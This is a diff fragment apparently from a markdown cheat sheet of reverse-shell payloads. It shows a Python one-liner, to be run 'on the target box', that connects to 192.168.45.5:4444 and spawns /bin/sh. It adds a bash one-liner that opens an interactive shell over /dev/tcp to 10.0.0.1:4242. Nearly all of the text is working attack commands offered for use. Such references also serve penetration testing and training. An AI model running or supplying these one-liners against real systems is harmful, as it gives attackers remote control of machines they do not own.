@@ -31,6 +31,12 @@ nc -lvp 4444
 // Execute this command on the target box
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
+### Bash reverse shell one-liner
+```
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
 ### Improving your Shell
 ```
 # Python one liner
